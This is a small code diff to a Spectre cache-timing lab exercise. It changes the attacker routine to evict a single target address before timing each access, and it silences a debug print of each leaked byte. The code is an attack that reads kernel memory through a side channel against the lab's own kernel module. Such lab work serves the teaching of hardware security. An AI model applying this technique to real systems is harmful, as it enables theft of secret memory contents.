@@ -55,7 +55,8 @@ int run_attacker(int kernel_fd, char *shared_memory)
             for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) 
             {
                 void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
-                REPEAT(10) evict_all_cache();
+                evict_address(target_addr);
+                //REPEAT(10) evict_all_cache();
                 call_kernel_part1(kernel_fd, shared_memory, current_offset);
                 uint64_t time = time_access(target_addr);
                 if (time <= cache_stats.l2 + 20 /*Plus some padding*/) {
@@ -65,7 +66,7 @@ int run_attacker(int kernel_fd, char *shared_memory)
                 }
             }
         }
-        printf("[Part 1] Found char:%c:\n", leaked_byte);
+        //printf("[Part 1] Found char:%c:\n", leaked_byte);
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
